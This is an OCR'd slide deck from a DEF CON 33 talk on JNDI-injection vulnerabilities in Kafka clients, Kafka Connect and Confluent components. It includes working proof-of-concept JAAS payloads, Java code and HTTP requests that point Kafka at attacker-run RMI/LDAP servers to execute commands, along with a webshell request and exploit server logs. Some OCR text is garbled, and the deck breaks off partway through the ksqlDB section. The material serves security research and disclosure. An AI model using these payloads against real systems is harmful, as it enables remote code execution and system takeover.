---
title: "Client or Server The Hidden Sword of Damocles in Kafka"
speakers: ["Ji'an Zhou", "Ziyang Li"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Ji'an Zhou & Ziyang Li - Client or Server The Hidden Sword of Damocles in Kafka.pdf"
pages: 121
sha256: "baecb4744f66ee2895c6ede73e556d7cfbce4b56b492e746f805c40c0a12bfad"
text_chars: 59540
ocr_pages: 72
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.4
ocr_unreliable_blocks: 4
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T07:02:48Z"
---
# Client or Server The Hidden Sword of Damocles in Kafka

**Speakers:** Ji'an Zhou, Ziyang Li  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Ji'an Zhou & Ziyang Li - Client or Server The Hidden Sword of Damocles in Kafka.pdf` (121 pages)


## Slide 1

Kafka

Client or Server? The Hidden Sword of Damocles in Kafka

## Slide 2

# ❒ **About us**

#### Ziyang Li

- Security Engineer from Alibaba Cloud

- Twitter: @lz2y1

Ji'an Zhou

- Security Engineer from Alibaba Cloud

- Twitter: @azraelxuemo

Ying Zhu

- Security Engineer from Alibaba Cloud

## Slide 3

# ❒ **Agenda**

## 1. Introduction & Background 2. Previous Research & Bypass

3. The Journey of Hunting Bugs in Kafka Ecosystem 4. Uncovering Hidden Vulnerabilities in Kafka Broker 5. Defense

## Slide 4

1. Introduction & Background

## Slide 5

# ❒ What is Kafka

Used by thousands of companies
An event streaming platform
High availability
Scalable
High Throughput
Permanent storage

## Slide 6

❒ What is Kafka


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
OC What is Kafka
Producer Producer Producer
Kafka Cluster
Topic Topic Topic
Partition Partition Partition
Partition Partition Partition
Partition Partition Partition
Consumer Consumer Consumer
```

## Slide 7

# ❒ Kafka Broker

https://developer.confluent.io/courses/architecture/broker/


> Recovered by OCR — confidence 90/100 on the text kept, 63/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
O Kafka Broker
KRaft Consensus protocol
for the Control Plane
i Kafka Cluster
e Old: Zookeeper
e New: KRaft Controller
Control Plane
THIS MODULE
Inside the Apache® Kafka Broker
Client request processing
, Data Plane
+ data replication
```

## Slide 8

# ❒ Kafka Broker

https://developer.confluent.io/courses/architecture/broker/


> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1 Kafka Broker
Broker :
'
Request ite}
KAFKA BROKER Queve Threads
Socket
o Receive —© Network
Buffer Threads ¢
Tiered
ry Fetch
APF Threads
Kafka Client Purgatory
(Map)
(per network
thread)
Other Kafka Brokers
```

## Slide 9

# ❒ Kafka Ecosystem

https://medium.com/@navdeepsharma/the-ecosystem-of-apache-kafka6087b621d16f


> Recovered by OCR — confidence 81/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
0 Kafka Ecosystem
API i]
I mS | Kafka Kafka
| ————— Producer caine
Kafka Connect
Sink
Target
Database
Source & Kafka Connect
Database | Source
```

## Slide 10

🤔 Are there any security risks?

## Slide 11

2. Previous Research & Bypass

## Slide 12

❒ CVE-2023-25194

Kafka-Clients

Kafka Connect

## Slide 13

# ❒ CVE-2023-25194

### Control Kafka connection string →Trigger JNDI injection →RCE


> Recovered by OCR — confidence 91/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1} CVE-2023-25194
Control Kafka connection string — Trigger JNDI injection — RCE
JVM
~
Kafka client
@ lookup
@ connection string
@ payload
© taken over
Attacker Evil JNDI Server
```

## Slide 14

# ❒ CVE-2023-25194

### PoC

Attacker-controlled


> Recovered by OCR — confidence 86/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
0 CVE-2023-25194
PoC
1. public static void main(String[] args) throws Exception{
2 Properties properties = new Properties();
3 properties.put("bootstrap.servers", "127.0.0.1:1234");
4 String deserializer = "org.apache.kafka.common.serialization.StringDeserializer";
5 properties.put("key.deserializer", deserializer);
6 properties.put("value.deserializer", deserializer);
7 properties.put("sasl.mechanism", "PLAIN");
8 properties.put("security.protocol", "SASL_SSL"); Attacker-controlled
9 String jaasConfig = “com.sun.security.auth.module.JndiLoginModule required\n" +
13 "group.provider.url=\"xxx\";";
14 properties.put("sasl.jaas.config", jaasConfig);
15 KafkaConsumer<String, String> kafkaConsumer = new KafkaConsumer<>(properties) ;
16 kafkaConsumer.close();
```

## Slide 15

# ❒ The principle of CVE-2023-25194

PoC

KafkaConsumer.<init>

→ ClientUtils.createChannelBuilder

- → ChannelBuilders.clientChannelBuilder

→ SaslChannelBuilder.configure

→ ...

→ LoginContext.login

→ JNDILoginModule.login

## Slide 16

# ❒ The principle of CVE-2023-25194

The process of LoginContext.login

KafkaConsumer.<init>

→ ClientUtils.createChannelBuilder

- → ChannelBuilders.clientChannelBuilder

- → SaslChannelBuilder.configure

→ ...

- → LoginContext.login

- → JNDILoginModule.login

## Slide 17

# ❒ The principle of CVE-2023-25194

### JndiLoginModule.login

KafkaConsumer.<init>

- → ClientUtils.createChannelBuilder

- → ChannelBuilders.clientChannelBuilder

- → SaslChannelBuilder.configure

- → ...

- → LoginContext.login

- → JNDILoginModule.login

## Slide 18

# ❒ The principle of CVE-2023-25194

### InitialContext.lookup

- A common sink, like Runtime.exec, ObjectInputStream.readObject

- Lookup with an untrusted address leads to RCE

## Slide 19

# ❒ The principle of CVE-2023-25194

The attack process


> Recovered by OCR — confidence 84/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
0 The principle of CVE-2023-25194
The attack process
@ instantiate |
LoginContext
t
® set config & login
Subject © construct > oO
[ee —@ initialize with Subject, CallbackHandler, options H5
@ login >
JndiLoginModule
lookup
Kafka client
@ connection string @® payload
taken over
Attacker
Evil JNDI Server
```

## Slide 20

# ❒ The patch of CVE-2024-25194

The patch

By default, JndiLoginModule is disabled in Apache Kafka 3.4.0.


> Recovered by OCR — confidence 84/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
0 The patch of CVE-2024-25194
The patch
By default, JndiLoginModule is disabled in Apache Kafka 3.4.0.
public static final String DISALLOWED_LOGIN_MODULES_DEFAULT /= "com.sun.security.auth.module.JndiLoginModule";
private static void throwIfLoginModuleIsNotAllowed(AppConfAigurationEntry appConfigurationEntry) {
Set<String> disallowedLoginModuleList = Arrays.stream
System. getProperty (DISALLOWED_LOGIN_MODULES_@ONFIG, DISALLOWED_LOGIN_MODULES_DEFAULT).split(","))
.collect(Collectors.toSet());
ew : : v is not allowed. Update System property
+ DISALLOWED_LOGIN_MODULES_CONFIG + "' to allow " + loginModuleName) ;
```

## Slide 21

# ❒ The patch of CVE-2024-25194

Test the patch


> Recovered by OCR — confidence 89/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
0 The patch of CVE-2024-25194
16
18
20
21
22
23
24
25
26
Run:
le Jl
JNDI
at
Caused
at
at
at
at
at
at
at
Test the patch
String jaasConfig = "com.sun.security.auth.module.JndiLoginModule required\n" +
"user.provider.url=" +
"\"Ldap://Localhost/hhylKPnySW/PLain/Exec/eyJjbWQi0iJjYXQgL2VOYy9wYXNzd2QifQ==\"\n" +
"“useFirstPass=\"true\"\n" +
kafkaConsumer.close();
by:
org.
org.
org.
org.
org.
org.
org.
"group.provider.url=\"xxx\";";
properties.put("sasl.jaas.config", jaasConfig);
KafkaConsumer<String, String> kafkaConsumer = new KafkaConsumer<>(properties) ;
java.lang.IllegalArgumentException Create breakpoint :}| com.sun.security.auth.module.JndiLoginModule is not allowed.
apache.
apache.
apache.
apache.
apache.
apache.
apache.
. 4 more
kafka
kafka.
kafka.
kafka.
kafka.
kafka.
kafka.
common
common.
common.
common.
common.
.security.JaasContext.throwIfLqginModuleIsNotALlowed (JaasContext. java:113)
network.ChannelBuilders.create(ChannelBuilders. java:167)
```

## Slide 22

# ❒ The patch of CVE-2024-25194

### How the patch works


> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
0 The patch of CVE-2024-25194
How the patch works
JVM
cay © construct a}
—@ initialize with Subject, CallbackHandler, options-> “HB
® login
t
@ set config & login
® check login config
Kafka client
4
T
@ connection string
Attacker Evil JNDI Server
```

## Slide 23

🤔 Can we bypass?

## Slide 24

# ❒ The first idea to bypass

### Goal: Find other LoginModules


> Recovered by OCR — confidence 83/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
0 The first idea to bypass
Goal: Find other LoginModules
JVM
@ instantiate |
Subject © construct >
fe — @ initialize with Subject, CallbackHandler, options—>
@® login >
LoginContext ?LoginModule
® set config & login zi re
@ check login config
Kafka client
@ connection string
ns © taken over
```

## Slide 25

# ❒ The first idea to bypass

### Restrictions on the LoginModules

- Implement javax.security.auth.spi.LoginModule

- Exist in popular Java libs

- Can trigger RCE, Arbitrary File Write, Arbitrary File Read, etc

## Slide 26

# ❒ The first idea to bypass

### ProxyLoginModule


> Recovered by OCR — confidence 90/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
0 The first idea to bypass
ProxyLoginModule
public void initialize(Subject subject,
CallbackHandler callbackHandler, Map<String, ?> sharedState,
Map<String, ?> options) {
this.mod
ClassLoader loader = SecurityActions.getContextClassLoader();
try
this.delegate
{
ass</> Clazz
var8.printStackTrace();
return;
@ instantiate
Subject
; LoginContext
this.delegate.initialize(subject, callbackHandler, sharedState, options);
public boolean login() throws LoginException {
return this.delegate. login();
@ @ by Red Hat
@® construct © login
&initialize
AgentLoginModule
```

## Slide 27

# ❒ The first idea to bypass

### RCE via ProxyLoginModule


> Recovered by OCR — confidence 88/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
0 The first idea to bypass
16
17
18
19
20
22
23
24
25
26
Run:
RCE via ProxyLoginModule
String jaasConfig = "org.jboss.security.auth.spi.ProxyLoginModule required\n" +
"moduLeName=\"com.sun.security.auth.module.JndiLoginModule\"\n" +
"user.provider.url=" +
"useFirstPass=\"true\"\n" +
properties.put("sasl.jaas.config", jaasConfig);
KafkaConsumer<String, String> kafkaConsumer = new KafkaConsumer<>(properties) ;
kafkaConsumer.close();
}
JbossBypass
Caused by: javax.security.auth.login.FailedLoginException Create breakpoint : User not found
at org.jboss.security.auth.spi.ProxyLoginModule. Login(ProxyLoginModule. java:121)}] <4 internal lines>
```

## Slide 28

# ❒ The first idea to bypass

base64 decode

😎 RCE Again


> Recovered by OCR — confidence 92/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
O The first idea to bypass
Gadget : Plain
Payload : Exec
SR:
"cmd":"cat /etc/passwd"}
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode. At other times this information is provided by
# Open Directory.
it
# See the opendirectoryd(8) man page for additional information about
# Open Directory!
##
nobod 2:-2:Unprivileged User:/var/empty:/usr/bin/false es)
:0:0:System Administrator:/var/root:/bin/sh
```

## Slide 29

# ❒ The first idea to bypass

### The attack process


> Recovered by OCR — confidence 76/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
0 The first idea to bypass
The attack process
JVM
ama is © construct oO
—@ initialize with Subject, CallbackHandler, options-> -F5
© login
LoginContext r— ProxyLoginModule
@ set config & login ® construct @ ig
&initialize
® check login config ———— H5
Kafka client JNDILoginModule
4 @ lookup
@ taken over w
|
Attacker Evil JNDI Server
```

## Slide 30

# ❒ The first idea to bypass

### Arbitrary File Write via two LoginModules

① Prepare log.conf

- ② Send payload1 to specify the log config

③ Send payload2 →Trigger an error →Write error log messages (with malicious content)

## Slide 31

# ❒ The first idea to bypass

### Arbitrary File Write via two LoginModules

④ Utilize the webshell

😎 RCE Again


> Recovered by OCR — confidence 85/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
0 The first idea to bypass
Arbitrary File Write via two LoginModules
(4) Utilize the webshell
Pretty Raw Hex > Pretty Raw Hex Render RCE Again nn =
1 GET /webshel11.jsp?a=whoami HTTP/1.1 https://localhost:9443/java. lang.UNIXProcess@88de1767
3 Connection: close java.security.AccessController.doPrivileged(AccessController. java:75
5 26 at com.tivoli.pd.jutil.PDBasicContext.<init>
(PDBasicContext. java:81)
29 at com.tivoli.mts.PDLoginModule.abort(PDLoginModule. java: 38)
30 at sun.reflect.NativeMethodAccessorImpl. invoke@(Native Method)
31 at
```

## Slide 32

# ❒ The second idea to bypass

### LdapLoginModule

Obtain name, pwd via a CallbackHandler

Check if the pwd is blank

If not blank, trigger JNDI lookup

## Slide 33

# ❒ The second idea to bypass

Goal: Find a CallbackHandler for LdapLoginModule


> Recovered by OCR — confidence 80/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J The second idea to bypass
Goal: Find a CallbackHandler for eaproginwioaule
Pe. © construct oO
—@ initialize with Subject, CallbackHandler, options-> “AB
® login
© obtain 2)
username, pwd
@ set fee & login
® check login config Beme
Kafka client ?CallbackHandler
@ connection string 1) payload
BS (2 taken over wo
Attacker Evil JNDI Server
```

## Slide 34

# ❒ The second idea to bypass

### Restrictions on the CallbackHandlers

- Can handle NameCallback, PasswordCallback (no exception)

- Can obtain password (not blank)

- Implement org.apache.kafka.common.security.auth.AuthenticateCallbackHandler

Can’t handle NameCallback

May raise ClassCastException

## Slide 35

# ❒ The second idea to bypass

😵 Which vendors implemented the interfaces of Kafka?

## Slide 36

❒ The second idea to bypass


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J The second idea to bypass
```

## Slide 37

# ❒ The second idea to bypass

the creators of

the custodians of

## Slide 38

# ❒ The second idea to bypass

has their release versions

https://docs.confluent.io/platform/current/installation/versions-interoperability.html

## Slide 39

# ❒ The second idea to bypass

cp-kafka

cp-server

Community Version of Kafka

Commericial Version of Kafka

https://docs.confluent.io/platform/current/installation/docker/image-reference.html

## Slide 40

# ❒ The second idea to bypass

### cp-kafka

Community Version of Kafka

cp-server

Commericial Version of Kafka

Nov 2024: Tested latest version(7.7.1), fixed in new iteration

## Slide 41

# ❒ The second idea to bypass

### FileBasedDynamicPlainLoginCallbackHandler

Obtain name, pwd from a local file


> Recovered by OCR — confidence 83/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J The second idea to bypass
@ extract
—@ initialize with Subject, CallbackHandler, options “AB
@ login
LoginContext <—————@ commit, polulate Subject» Samp leLoginModule
username,
© handle
return username, pwd
|
_ 7)
FileBasedDynamicPlain
LoginCallbackHandler
© read
name:admin
pwd:admin123
user.conf
Obtain name, pwd from a local file
```

## Slide 42

# ❒ The second idea to bypass

### The simplified code of FileBasedDynamicPlainLoginCallbackHandler

Separated by semicolon


> Recovered by OCR — confidence 81/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J The second idea to bypass
The simplified code of FileBasedDynamicPlainLoginCallbackHandler
8 » public class HandlerTest {
> > public static void main(String[] args) throws IOException {
Path path = Paths.get( first: "user.conf"); //user-controlled
byte[] bytes = Files.readAllBytes(path);
Properties props = new Properties();
14 String name = (String) props.get("name"); //user-controlled f
15 String pwd = (String) props.get("pwd"); //user-con ae Seon
16 System.out.println("name: " + name); 7 namesadmin
System.out.println("pwd: " + pwd);
pwd:admini23
ui Separated by semicolon
Run: HandlerTest
+t name: admin
pwd: admin1i23
```

## Slide 43

# ❒ The second idea to bypass

Almost there?

✅ Implement org.apache.kafka.common.security.auth.AuthenticateCallbackHandler ✅ Can handle NameCallback, PasswordCallback (no exception) ✅ Can obtain password (not blank)

## Slide 44

# ❒ The second idea to bypass

The file named user.conf is created by us. Can we find a more common one?

🤔


> Recovered by OCR — confidence 90/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J The second idea to bypass
>
Run:
The file named user.conf is created by us. ‘
Can we find a more common one?
public class HandlerTest {
public static void main(String[] args) throws IOException {
Path path = Paths.get( first: "user.conf"); //user-controlled
byte[] bytes = Files.readAllBytes(path);
Properties props = new Properties();
props.load(new StringReader(new String(bytes)));
String name = (String) props.get("name"); //user-controlled
String pwd = (String) props.get("pwd"); //user-controlled =
System.out.println("name: " + name);
System.out.println("pwd: " + pwd);
= user.cont
HandlerTest
/Library/Java/JavaVirtualMachines/jdk-17.jdk/Contents/Home/bin/java
name: admin
pwd: admini23
```

## Slide 45

# ❒ The second idea to bypass

🥳 Absolutely!


> Recovered by OCR — confidence 90/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J The second idea to bypass
8 >
10
11
12
13
14
16
17
18
Run:
> Absolutely!
public class HandlerTestNew {
public static void main(String[] args) throws IOException {
Path path = Paths.get( first: "/etc/passwd"); //user-controlled
Properties props = new Properties();
String name = (String) props.get("root"); //user-controlled
String pwd = (String) props.get("root"); //user-controlled
System.out.println("name: " + name);
System.out.println("pwd: " + pwd);
HandlerTestNew
/Library/Java/JavaVirtualMachines/jdk-17.jdk/Contents/Home/bin/java
= user.conf
```

## Slide 46

# ❒ The second idea to bypass

PoC


> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J The second idea to bypass
PoC
1 import org.apache.kafka.clients.producer.KafkaProducer;
2 import java.util.Properties;
3
4
5 public class kafka {
6 public static void main(String[] args) {
T Properties props = new Properties();
8 props.put("security.protocol","SASL_PLAINTEXT") ;
9 props.put("bootstrap.servers", "localhost:9092");
10 props.put("sasl.mechanism", "PLAIN");
11 props.put("sasl. login.callback.handler.class",
"io.confluent.kafka.security.auth.plain.FileBasedDynamicPlainLoginCallbackHandler") ;
12 props.put("value.serializer", “org.apache.kafka.common.serialization.StringSerializer") ;
13 props.put("key.serializer", "“org.apache.kafka.common.serialization.StringSerializer");
14 props.put("sasl.jaas.config","com.sun.security.auth.module.LdapLoginModule required
java.naming. factory. initial=\"com.sun. jndi.rmi. registry.RegistryContextFactory\" userProvider=\"${rmi url}\"
credentials_path=\"/etc/passwd\" username_config=\"root\" password_config=\"root\" ;");
15 new KafkaProducer(props) ;
16 }
```

## Slide 47

# ❒ The second idea to bypass

### RCE via LdapLoginModule

##### Kafka client

JNDI Server

😎 RCE Again


> Recovered by OCR — confidence 88/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J The second idea to bypass
RCE via LdapLoginModule
14 properties.put("sasl.login.callback.handler.class",
Kafka client 16 String jaasConfig = "com.sun.security.auth.module.LdapLoginModule required\n" +
a7, "java.naming. factory.initial=\"com.sun.jndi.rmi.registry.RegistryContextFactory\"\n" +
18 "userProvider=" +
19 "\"pmi://Localhost :1099/Deserialize/Jackson/CommandJson0bject/open -a Calculator.app\"\n"
20 "credentials_path=\"/etc/passwd\"\n" +
21 "username_config=\"root\"\n" +
22 "password_config=\"root\" ;";
23 System. out.println(jaasConfig) ;
24 properties.put("sasl.jaas.config", jaasConfig);
25 KafkaConsumer<String, String> kafkaConsumer = new KafkaConsumer<>(properties) ;
26 kafkaConsumer.close();
Run: Bypass4
> & Caused by: java.lang.NullPointerException Create breakpoint
TT at com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.postInitialization(AbstractTranslet. ja
& RCE Again
[LDAPS] jks file is not specified, skipping to start LDAPS server
[HTTP] Listening on 127.0.0.1:3456
[RMI] Listening on 127.0.0.1:1099
JNDI Server [LDAP] Listening on 127.0.0.1:1389
[RMI] Have connection from /127.0.0.1:49635
[RMI] Reading message...
[RMI] Is RMI.lookup call for Deserialize/Jackson/CommandJsonObject/open -a Calculator.app 2
[RMI] Send result for /Deserialize/Jackson/CommandJsonObject/open -a Calculator.app
[Deserialize] [Jackson|JsonObject] [Command] Cmd: open -a Calculator.app
[RMI] Closing connection
```

## Slide 48

# ❒ The second idea to bypass

### The attack process


> Recovered by OCR — confidence 81/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[J The second idea to bypass
The attack process
JVM
ae © construct 0
—@ initialize with Subject, CallbackHandler, options AB
® login
LoginContext LdapLoginModule
t : © obtain |
@ set eal & login [ username pwd
@® check login config
{ 7 J lookup
FileBasedDynamicPlain
Kafka client LoginCallbackHandler
@ connection string ; @® payload
Attacker Evil JNDI Server
```

## Slide 49

# 3. The Journey of Hunting Bugs in Kafka Ecosystem

## Slide 50

# ❒ Take over the Kafka Connect again

Trigger JNDI injection in kafka-clients of Commericial Version of Kafka


> Recovered by OCR — confidence 80/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
0 Take over the Kafka Connect again
JVM
a © construct oO
—©@ initialize with Subject, CallbackHandler, options “AB
® login
LoginContext LdapLoginModule
Trigger JNDI injection in kafka-clients of @ set cont & login [usm eae A
Commericial Version of Kafka | oT
® check login config = ren
Kafka client FileCallbackHandler
@ connection string ® ae
y @ set up -C-)
Attacker Evil JNDI Server
```

## Slide 51

❒ CVE-2023-25194

Kafka-Clients

Kafka Connect

## Slide 52

🤔 Can Kafka Connect be exploited?

## Slide 53

# ❒ Take over the Kafka Connect again

https://docs.confluent.io/platform/current/get-started/platform-quickstart.html


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
0 Take over the Kafka Connect again
Step 1: Download and start Confluent Platform
In this step, you start by cloning a GitHub repository. This repository contains a Docker compose file and some required
configuration files. The docker-compose.yml file sets ports and Docker environment variables such as the replication
factor and listener properties for Confluent Platform and its components. To learn more about the settings in this file, see
Docker Image Configuration Reference for Confluent Platform.
1. Clone the Control Center branch of the Confluent Platform all-in-one example repository, for example:
git clone https://github.com/confluentinc/cp-all-in-one.git o
2. Change to the cp-ali-in-one directory:
cd cp-all-in-one/cp-all-in-one o
3. Check out the controi-center branch:
git checkout control-center a
4. Start the Confluent Platform stack with the -a option to run in detached mode:
docker compose up -d a]
If you using an Docker Compose V1, you need to use a dash in the docker compose Commands. For example:
docker-compose up -d iE}
On this page:
Prerequisites
Step 1: Download and start
Confluent Platform
Step 2: Create Kafka topics for
storing your data
Create the pageviews topic
Create the users topic
Step 3: Generate mock data
Inspect the schema of a topic
Step 4: Uninstall and clean up
Related content
```

## Slide 54

# ❒ Take over the Kafka Connect again

PoC


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
0 Take over the Kafka Connect again
PoC
POST /connectors HTTP/1.1
Host: 172.17.0.1:8083
Content-Type: application/json
Content-Length: 809
{
"name": "mysql-connect",
"config": {
"connector.class": "io.debezium.connector.mysql.MySqlConnector",
"database.hostname": "172.17.0.1",
"database.port": "3306",
"database.user": "root",
"database.password": "root",
"database.server.id": ”111",
"database.server.name": "test1",
"database.history.kafka.bootstrap.servers": "172.17.0.1:9092",
"database.history.kafka.topic": "quickstart-events", "database.history.producer.security.protocol": "SASL_SSL",
"database.history.producer.sasl.mechanism": "PLAIN",
"database.history.producer.sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required
user.provider.url="Idap://47.76.x.x:1099/cmd" useFirstPass="true" serviceName="x" debug="true" group.provider.url="xxx";"
}
}
```

## Slide 55

# ❒ Take over the Kafka Connect again

PoC


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
0 Take over the Kafka Connect again
PoC
PUT /api/connect/connect-default/connectors/MirrorCheckpointConnectorConnector_21/config HTTP/1.1
Host: 172.17.0.1:9021
Content-Length: 772
X-Requested-With: undefined
Content-Type: application/json
"name": "MirrorCheckpointConnectorConnector_21",
"connector.class": "org.apache.kafka.connect.mirror.MirrorCheckpointConnector",
"source.cluster.alias": "a",
"admin.bootstrap.servers": "172.17.0.1:9092",
"admin.sasl.mechanism": "PLAIN",
"admin.security.protocol": "SASL_PLAINTEXT",
"admin.sasl.login.callback.handler.class": "io.confluent.kafka.security.auth. plain.FileBasedDynamicPlainLoginCallbackHandler",
"admin.sasl.jaas.config": "com.sun.security.auth.module.LdapLoginModule required
java.naming.factory.initial=\"com.sun.jndi.rmi.registry.RegistryContextFactory\"
userProvider=\"rmi://47.76.x.x:1099/Deserialize/Jackson/CommandJsonObject/base64dG91Y2ggL3RtcC9zdWNjZXNzMjlzLnR4dA==\"
credentials_path=\"/etc/passwd\" username_config=\"root\" password_config=\"root\" ;"
}
```

## Slide 56

# ❒ Take over the Kafka Connect again

Trigger JNDI injection

Achieve RCE Again！


> Recovered by OCR — confidence 79/100 on the text kept, 79/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
(1) Take over the Kafka Connect again
AC [root@iZj6cipt : poc]# java r JNDIMap-0.0.2.jar -i 47.76.
[RMI] Listening on 47.76. 1099
[LDAPS] jks file is not s ed, skipping to start LDAPS server
[HTTP] Listening on 47.76 13456
[LDAP] Listening on 47.76 11389
[RMI] Have connection from /47.83. 154230 Trigger J N DI injection
[RMI] Reading message...
[RMI] Is RMI. lookup call for Deserialize/Jackson/CommandJson0bject/base64dG91Y2ggL3RtcC9zdWNj ZXNZMj IzLnR4d
[RMI] Send result for /Deserialize/Jackson/CommandJson0bject/base64dG91Y2ggL3RtcC9zdWNj ZXNZMj IzLnR4dA:
[Deserialize] [Jackson|JsonObject] [Command] Cmd: touch /tmp/success223.txt
[RMI] Closing connection
[root@iZj6c3y50528wrn54avm15Z kafka]# docker ps
CONTAINER ID IMAGE COMMAND CREATED STATUS
NAMES
6ece4076ec17 ~~ conf luentinc/cp-ksqldb-cli:7.5.0 "/bin/sh" 57 minutes Up 57 minutes
ksqldb-cli
85224bd8cad9 conf luentinc/ksqldb-examples:7.5.@ “bash -c ‘echo Waiti... 57 minutes Up 57 minutes
ksql-datagen
74968890732a confluentinc/cp-enterprise—control-center:7.5.@ "/etc/confluent/dock... 57 minutes Up 57 minutes ~@.0.0:9021->9021/tcp, :::
9021->9021/tcp control-center
6f8e18e5280 confluentinc/cp-ksqldb-server:7.5.0 etc/conf luent/dock... 57 minutes Up 57 minutes ~@.0.0:8088->8088/tcp, :::
. . | 8088->8088/tcp ksqldb-server
Ach | eve R EF A al Nn 4b1fc21idfccb confluentinc/cp-kafka-rest:7.5.0 "/etc/conf luent/dock... 57 minutes Up 57 minutes +@.0.0:8082->8082/tcp, :::
e 8082->8082/tcp rest-proxy
albc24fa7d92 = |cnfldemos/cp-serve nnect-datagen:0.6.2-7.5.0| "/etc/confluent/dock. 57 minutes Up 57 minutes .@.0.0:8083->8083/tcp,
8083->8083/tcp, 9092/tcp connect
b11e6b4099b5 ~~ conf luentinc/cp-schema-registry:7.5.0 "/etc/conf luent/dock... 57 minutes Up 57 minutes -0.0.0:8081->8081/tcp,
8081->8081/tcp schema-registry
#28cc@0791c@ conf luentinc/cp-server:7.5.@ "/etc/conf luent/dock... 57 minutes Up 57 minutes -0.0.0:9092->9092/tcp,
9092->9092/tcp, 0.0.0.0:9101->9101/tcp, :9101->9101/tcp broker
[root@iZj6c3y50528wrn54avm15Z kafka]# docker exec -it albc24fa7d92 1s /tmp
hsperfdata_appuser |success223.txt
[root@iZj6c3y50528wrn54avm15Z kafkal#
```

## Slide 57

🤯 Something else?

## Slide 58

# ❒ **Take over the ksqlDB Server**

###### ksqlDB for Confluent Platform

ksqlDB is a database to help developers create stream processing applications on top of Apache Kafka®

https://docs.confluent.io/platform/current/ksqldb/overview.html

## Slide 59

# ❒ **Take over the ksqlDB Server**

https://raw.githubusercontent.com/confluentinc/cp-all-in-one/7.7.1-post/cp-all-in-one-kraft/docker-compose.yml

## Slide 60

# ❒ **Take over the ksqlDB Server**


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Oj Take over the ksqiIDB Server
T
ME Overview hree obvious components
Brokers
Topics
Brokers
Connect
ksqIDB
Total Production (bytes / second) Consumption (bytes / second)
Consumers
Replicators
Cluster settings Topics
Total Partitions Under replicated partitions Out-of-sync replicas
Health+ @
Connect
Clusters Running Paused Degraded Failed
ksqIDB
Clusters Persistent queries
```

## Slide 61

# ❒ **Take over the ksqlDB Server**


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Oj Take over the ksqiIDB Server
Just you!
Cluster overview ksqld b1
Brokers
Editor Flow Streams Tables Persistent queries Settings
Topics
Connect
ksqIDB
2 1 select * from KSQL_PROCESSING_LOG EMIT CHANGES;
Consumers
Replicators
Cluster settings
e@ Add query properties
Health+ @® auto.offset.reset = | Latest v| @
+Add another field Processing query... | O |
```

## Slide 62

🤯 Read documents to know more about it

## Slide 63

# ❒ **Take over the ksqlDB Server**

https://github.com/confluentinc/ksql/issues/8925


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
1) Take over the ksqiDB Server
ksql> INSERT INTO TEST (test) VALUES (‘hi');
Failed to insert values into ‘TEST’.
Caused by: |Producer]jis closed forcefully.
Expected behavior
We hope that the insert succeeds in the same way that it succeeds when using a docker-com
there is more context available in the error on why this is occurring. Wait, Producer?
Actual behaviour
A clear and concise description of what actually happens, including:
1. CLI output
2. Error messages
3. KSQL logs
